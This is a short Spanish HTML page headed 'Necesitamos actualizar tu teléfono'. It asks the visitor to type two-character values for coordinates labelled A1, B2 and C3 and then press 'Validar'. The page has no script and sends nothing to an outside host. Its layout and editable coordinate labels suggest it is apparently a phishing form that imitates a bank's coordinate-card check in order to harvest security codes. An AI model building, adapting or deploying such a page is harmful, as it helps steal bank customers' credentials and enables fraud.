
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Actualizar Teléfono</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #ffffff;
      padding: 2rem;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    h2 {
      color: #dc3545;
      margin-bottom: 2rem;
    }

    .code-container {
      display: flex;
      justify-content: center;
      gap: 1rem;
    }

    .section {
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .editable-label {
      width: 40px;
      text-align: center;
      border: none;
      border-bottom: 1px dashed #ccc;
      font-size: 16px;
      margin-bottom: 0.3rem;
    }

    input[type="text"] {
      width: 40px;
      height: 40px;
      font-size: 22px;
      text-align: center;
      border: 1px solid #000;
      border-radius: 5px;
    }

    button {
      margin-top: 2rem;
      padding: 10px 20px;
      font-size: 16px;
      background-color: #dc3545;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }

    button:hover {
      background-color: #b02a37;
    }
  </style>
</head>
<body>
  <h2>Necesitamos actualizar tu teléfono</h2>
  <form action="verificar.html" method="GET">
    <div class="code-container">
      <div class="section">
        <input type="text" class="editable-label" value="A1" />
        <input type="text" maxlength="2" required />
      </div>
      <div class="section">
        <input type="text" class="editable-label" value="B2" />
        <input type="text" maxlength="2" required />
      </div>
      <div class="section">
        <input type="text" class="editable-label" value="C3" />
        <input type="text" maxlength="2" required />
      </div>
    </div>
    <button type="submit">Validar</button>
  </form>
</body>
</html>
